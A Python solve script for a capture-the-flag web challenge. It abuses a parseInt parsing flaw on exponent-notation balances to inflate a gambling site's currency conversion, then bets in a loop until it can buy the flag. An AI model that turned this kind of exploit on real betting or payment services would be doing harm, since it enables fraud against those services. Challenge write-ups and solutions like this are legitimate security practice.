import requests

URL = 'https://chall.polygl0ts.ch:8148'

s = requests.Session()

while True:
    s.cookies.clear()

    # lose almost all coins so the balance will be something like 1.1858461261560205e-20
    res = s.post(URL + '/api/gamble', json={'currency': 'coins', 'amount': '0.0000091'}).json()
    if res['win']:
        continue

    # parseInt('1.1858461261560205e-20') = 1
    s.post(URL + '/api/convert', json={'amount': '8'})

    balance = 0.08
    while balance > 0 and balance < 10:
        if balance < 1:
            bet_amount = balance
        else:
            bet_amount = min(balance,(10+balance)/9)
        res = s.post(URL + '/api/gamble', json={'currency': 'usd', 'amount': bet_amount}).json()
        balance = res['new_balance']
        print(balance)

    if balance >= 10:
        res = s.post(URL + '/api/flag', json={'amount': '10'}).json()
        print(res['flag'])
        break
